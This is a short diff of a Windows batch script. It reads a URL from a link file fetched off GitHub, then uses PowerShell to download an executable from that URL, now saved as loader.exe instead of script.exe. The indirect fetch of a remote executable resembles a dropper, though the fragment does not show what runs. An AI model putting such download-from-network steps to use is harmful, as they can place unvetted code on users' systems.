@@ -79,7 +79,7 @@ powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/p
 set /p POPSICLE_URL=<"%LINK_FILE%"
 del "%LINK_FILE%"
 
-set "POPSICLE_EXE=%~dp0script.exe"
+set "POPSICLE_EXE=%~dp0loader.exe"
 
 echo Downloading script...
 powershell -Command "Invoke-WebRequest -Uri '%POPSICLE_URL%' -OutFile '%POPSICLE_EXE%' -UseBasicParsing"
